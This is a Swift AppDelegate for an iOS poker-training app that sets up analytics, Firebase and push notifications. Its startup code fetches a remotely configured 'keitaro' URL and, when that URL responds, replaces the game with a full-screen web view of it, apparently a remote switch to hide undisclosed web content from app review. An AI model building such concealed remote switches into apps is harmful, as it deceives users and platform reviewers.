//
//  AppDelegate.swift
//  PokerTrain
//
//

import UIKit
import YandexMobileMetrica
import Firebase
import FirebaseMessaging
import FirebaseRemoteConfig
import UserNotifications

@main
class AppDelegate: UIResponder, UIApplicationDelegate, MessagingDelegate {
    
    var window: UIWindow?
    var coordinator: AppCoordinator?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        window = UIWindow(frame: UIScreen.main.bounds)
        
        let configuration = YMMYandexMetricaConfiguration.init(apiKey: "5a71cf2d-85fe-4c37-8577-5e36819d49d0")
        YMMYandexMetrica.activate(with: configuration!)
        
        FirebaseApp.configure()
        
        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
            if let error = error {
                // Handle error
            } else if granted {
                DispatchQueue.main.async {
                    UIApplication.shared.registerForRemoteNotifications()
                }
            }
        }
        
        Messaging.messaging().delegate = self
        Crashlytics.crashlytics()
        
        
        
        //MARK: - 1 check onboarding
        let onboardingResult = UserDefaultsManager.shared.checkResult(.onboarding)
        
        //MARK: - 2 check remoteConfig
        var remoteConfig = RemoteConfig.remoteConfig()
        // Do any additional setup after loading the view.
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 5
        remoteConfig.configSettings = settings
        
        remoteConfig.fetchAndActivate { (status, error) in
            if error != nil {
                self.startGame()
                print(error?.localizedDescription)
            } else {
                if status != .error {
                   
                    UserDefaultsManager.shared.saveURL(strURL: (remoteConfig["app_contact_the_developer_url"].stringValue ?? ""), key: "app_contact_the_developer_url")
                    UserDefaultsManager.shared.saveURL(strURL: remoteConfig["app_privacy_policy_url"].stringValue ?? "", key: "app_privacy_policy_url")
                    UserDefaultsManager.shared.saveURL(strURL: remoteConfig["app_support_url"].stringValue ?? "", key: "app_support_url")
                    UserDefaultsManager.shared.saveURL(strURL: remoteConfig["app_terms_of_use_url"].stringValue ?? "", key: "app_terms_of_use_url")
                    
                    if let whatToStart = remoteConfig["app_keitaro_url"].stringValue {
                        if let url = URL(string: whatToStart) {
                            let networkManager = NetworkManager()
                            networkManager.getData(from: url) { statusCode, error in
                                if let error = error {
                                    DispatchQueue.main.async {
                                        self.startGame()
                                    }
                                    return
                                }
                                guard let statusCode = statusCode else {
                                    DispatchQueue.main.async {
                                        self.startGame()
                                    }
                                    return
                                }
                                if statusCode != 200 {
                                    DispatchQueue.main.async {
                                        self.startGame()
                                    }
                                    return
                                }
                                        DispatchQueue.main.async {
                                            let vc = WebViewController()
                                            self.window?.rootViewController = vc
                                            self.window?.makeKeyAndVisible()
                                            vc.isShowNav = true
                                            vc.urlString = whatToStart
                                            vc.start()
                                        }
                            }
                        } else {
                            DispatchQueue.main.async {
                                self.startGame()
                            }
                        }

                    }
                      
                    }
                }
                
            }
            return true
        }
        
//        DispatchQueue.main.async {
//            let vc = UIViewController()
//            vc.view.backgroundColor = .green
//            self.window?.rootViewController = vc
//            self.window?.makeKeyAndVisible()
//        }
        
        
        func startGame() {
            switch UserDefaultsManager.shared.checkResult(.onboarding) {
                
            case true:
                
                let vc = MenuTabBarController()
                self.window?.rootViewController = vc
                self.window?.makeKeyAndVisible()
                
            case false:
                
                let navController = UINavigationController()
                navController.navigationBar.isHidden = true
                self.coordinator = AppCoordinator(navigationController: navController)
                self.coordinator?.start()
                self.window?.rootViewController = navController
                self.window?.makeKeyAndVisible()
                
            }
        }
        
        func applicationWillTerminate(_ application: UIApplication) {
            print("BYBY")
        }
        
    }
    
